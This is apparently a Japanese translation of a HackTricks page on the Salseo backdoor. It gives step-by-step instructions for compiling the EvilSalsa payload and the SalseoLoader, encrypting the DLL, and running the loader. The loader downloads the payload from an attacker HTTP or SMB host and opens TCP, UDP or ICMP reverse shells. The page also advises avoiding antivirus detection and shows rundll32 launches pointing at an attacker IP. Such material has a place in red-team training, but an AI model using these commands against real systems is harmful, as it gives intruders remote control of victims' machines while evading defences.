# Salseo

{% hint style="success" %}
AWSハッキングの学習と練習：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングトリックを共有してください。

</details>
{% endhint %}

## バイナリのコンパイル

Githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**がインストールされている必要があります。

これらのプロジェクトを、使用するWindowsボックスのアーキテクチャ用にコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルします）。

Visual Studio内の**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを選択できます。

（\*\*このオプションが見つからない場合は、**"Project Tab"**をクリックしてから**"\<Project Name> Properties"**をクリックします）

![](<../.gitbook/assets/image (132).png>)

その後、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## バックドアの準備

まず、**EvilSalsa.dll**をエンコードする必要があります。これを行うには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルできます：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### ウィンドウズ
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, 今、Salseoのすべてを実行するために必要なものが揃いました: **エンコードされたEvilDalsa.dll** と **SalseoLoaderのバイナリ**。

**SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないようにしてください...**

## **バックドアを実行する**

### **TCPリバースシェルを取得する（HTTPを介してエンコードされたdllをダウンロードする）**

リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたevilsalsaを提供することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルを取得する（SMBを介してエンコードされたdllをダウンロードする）**

リバースシェルリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルを取得する（エンコードされたdllはすでに被害者の中にある）**

**今回は、リバースシェルを受け取るためにクライアントに特別なツールが必要です。ダウンロード:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答を無効にする:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 被害者の内部で、salseoのことを実行しましょう：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に追加: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### このプロジェクトにDllExportをインストール

#### **ツール** --> **NuGet パッケージ マネージャー** --> **ソリューションの NuGet パッケージを管理...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport パッケージを検索 (Browse タブを使用) し、インストールを押して (ポップアップを受け入れる)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

プロジェクトフォルダに **DllExport.bat** と **DllExport\_Configure.bat** というファイルが表示されます

### DllExportをアンインストール

**アンインストール** を押します (はい、奇妙ですが、信じてください、必要です)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studioを終了し、DllExport\_configureを実行

単に Visual Studio を **終了** します

その後、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat** を実行します

**x64** を選択します (x64ボックス内で使用する場合、私の場合はそうでした)、**System.Runtime.InteropServices** (DllExportの**Namespace**内) を選択し、**Apply** を押します

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### プロジェクトを再度Visual Studioで開く

**\[DllExport]** はもはやエラーとしてマークされていません

![](<../.gitbook/assets/image (8) (1).png>)

### ソリューションをビルド

**Output Type = Class Library** を選択します (プロジェクト --> SalseoLoader プロパティ --> アプリケーション --> Output type = Class Library)

![](<../.gitbook/assets/image (10) (1).png>)

**x64プラットフォーム** を選択します (プロジェクト --> SalseoLoader プロパティ --> ビルド --> Platform target = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

ソリューションを**ビルド**するには: Build --> Build Solution (Outputコンソール内に新しいDLLのパスが表示されます)

### 生成されたDllをテスト

生成されたDllをテストしたい場所にコピーして貼り付けます。

実行:
```
rundll32.exe SalseoLoader.dll,main
```
もしエラーが表示されない場合、おそらく機能するDLLを持っています！！

## DLLを使用してシェルを取得する

**HTTP** **サーバー**を使用して、**nc** **リスナー**を設定することを忘れないでください

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
